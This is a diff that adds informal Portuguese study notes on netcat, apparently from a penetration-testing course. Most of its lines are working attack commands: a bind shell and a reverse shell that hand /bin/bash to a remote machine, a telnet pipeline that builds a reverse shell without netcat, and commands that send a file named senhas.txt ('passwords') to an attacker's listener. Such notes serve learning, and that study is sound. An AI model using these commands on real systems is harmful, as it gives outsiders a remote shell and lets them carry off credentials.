@@ -1,0 +1,31 @@
+para ver as opções .... ele pode atuar como cliente ou servidor 
+nc -h
+acessando uma porta nc 192.168.1.13 80
+get /
+abrindo uma porta
+nc -l -p 1000 -v abriu a porta vai em outro sistema que tenha nc .. digite nc 192.168.1.17 1000 abre o chat
+
+nc -l -p 2000 -e /bin/bash -v ... conexão direta com maquina de atk ... cliente e o servido meta acessando a porta nc 1+2 2000
+
+agora reversa ...
+
+nc -nlp 3000 -v
+nc 192.168.1.17 -e /bin/bash ou caminho até o cmd
+
+
+quando n a nc.. use no atacante 
+
+duas cmd ... nc -vnlp 3000 e 2000
+
+no mete use telnet 192.168.1.17 3000 | /bin/bash | telnet 192.168.1.17 2000
+tudo que eu digitar na porta 3000 ... tem que aparecer o resultado 2000  ou seja conexão reversa sem usar o nc só no linux
+
+copiando arquivos
+
+nc -vnlp 1500 > s.txt recebe o arquivo 
+nc 192.168.1.17 < senhas.txt
+
+para criar sudo nano senhas. txt
+para ver cat senhas.txt
+
+nc -vlnp 1500 < cryptcat  enviar 
